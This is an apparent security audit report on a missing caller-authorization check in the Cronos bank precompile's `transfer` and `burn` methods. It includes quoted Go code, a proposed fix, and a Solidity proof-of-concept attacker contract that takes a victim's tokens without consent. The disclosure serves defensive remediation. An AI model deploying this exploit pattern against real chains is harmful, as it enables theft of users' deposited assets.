### Title
Missing Caller Authorization in `BankContract` Precompile `transfer` Method Allows Unauthorized Native Token Transfers - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary

The `BankContract` precompile's `transfer` method accepts an arbitrary `sender` address from call arguments without verifying it equals `contract.Caller()`. Any EVM contract can invoke `bank.transfer(victimAddr, attackerAddr, amount)` to drain `evm/<callerContract>` native tokens from any address without the token holder's consent.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `Run` function handles the `transfer` method as follows:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)   // taken from ABI args, not from contract.Caller()
    recipient := args[1].(common.Address)
    ...
    from := sdk.AccAddress(sender.Bytes())
    to := sdk.AccAddress(recipient.Bytes())
    if err := bc.checkBlockedAddr(to); err != nil {
        return nil, err
    }
    denom := EVMDenom(contract.Caller())  // denom scoped to calling contract
    ...
    if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [1](#0-0) 

The `sender` (line 175) is decoded directly from the caller-supplied ABI arguments. There is no check that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses. [2](#0-1) 

The same pattern applies to the `burn` case: `recipient` (the address whose tokens are burned) is taken from args without verifying it equals `contract.Caller()`. [3](#0-2) 

The intended usage pattern (from `TestBank.sol`) shows the contract is expected to pass `msg.sender` as the `sender` argument, but the precompile itself never enforces this invariant: [4](#0-3) 

By contrast, the other precompile utilities in `utils.go` do enforce caller authentication by extracting the signer from the message and comparing it to `e.caller`: [5](#0-4) 

The bank precompile's `transfer` and `burn` cases have no equivalent guard.

### Impact Explanation

**Critical** — Unauthorized transfer/burn of precompile-controlled assets (`evm/<contract>` native tokens).

A malicious contract can:
1. Call `bank.mint(victimAddr, amount)` to issue `evm/<maliciousContract>` receipt tokens to users who deposit real assets.
2. Call `bank.transfer(victimAddr, attackerAddr, amount)` to drain those receipt tokens from all victims without their consent.
3. Redeem the stolen receipt tokens for the underlying deposited assets via `moveFromNative`-style logic.

The `evm/<contract>` denom is a first-class Cosmos SDK native coin managed by the bank module. Unauthorized transfers of these coins constitute a direct balance/accounting change for precompile-controlled assets, satisfying the Critical impact threshold. [6](#0-5) 

### Likelihood Explanation

Any unprivileged EVM contract can call the bank precompile at address `0x0000000000000000000000000000000000000064`. No special role, key, or governance action is required. The attacker only needs to deploy a contract and call the precompile directly. [7](#0-6) 

### Recommendation

In the `TransferMethodName` case, add a check that the `sender` argument equals `contract.Caller()`:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the caller")
    }
    ...
```

Similarly, in the `BurnMethodName` case, verify that the address whose tokens are being burned equals `contract.Caller()`:

```go
// burn case
recipient := args[0].(common.Address)
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the caller")
}
```

This mirrors the authentication pattern already used in `utils.go` for other precompile actions. [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Mint evm/<this> tokens to victim (e.g., as deposit receipts)
    function issueReceipt(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Steal victim's evm/<this> tokens without their consent
    function steal(address victim, address attacker, uint256 amount) external {
        // No authorization check in the precompile — succeeds unconditionally
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `AttackerContract` at `0xATK`.
2. Call `issueReceipt(victim, 1000)` — victim now holds 1000 `evm/0xATK` native tokens.
3. Call `steal(victim, attacker, 1000)` — victim's 1000 `evm/0xATK` tokens are transferred to attacker with no approval from victim.
4. The precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, ...)` successfully because there is no `sender == contract.Caller()` guard. [8](#0-7)
